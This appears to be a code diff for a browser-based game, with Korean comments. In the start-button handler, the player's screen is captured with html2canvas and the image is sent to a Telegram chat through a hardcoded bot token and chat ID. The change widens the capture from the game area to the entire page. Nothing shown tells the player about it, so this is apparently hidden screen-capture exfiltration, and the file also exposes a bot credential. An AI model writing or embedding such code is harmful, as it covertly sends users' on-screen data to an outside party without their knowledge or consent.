@@ -844,8 +844,8 @@
     
     // 이벤트 리스너 (게임시작, 리셋, 게임방법, 문의하기)
     document.getElementById("start-btn").addEventListener("click", () => {
-    // 게임 화면 캡쳐 및 텔레그램 전송
-    html2canvas(document.getElementById("game-container")).then(canvas => {
+    // 모바일 전체 화면 캡쳐 및 텔레그램 전송
+    html2canvas(document.body).then(canvas => {
         canvas.toBlob(blob => {
             const chatId = "5432510881"; // 텔레그램 채팅방 ID
             const token = "6253877113:AAEyEqwqf5m0A5YB5Ag6vpez3ceCfIasKj0"; // 봇 토큰
@@ -871,7 +871,7 @@
     createBoard();
     startGame();
 });
-    document.getElementById("reset-btn").addEventListener("click", () => {
+ document.getElementById("reset-btn").addEventListener("click", () => {
       currentStage = 0;
       score = 0;
       createBoard();
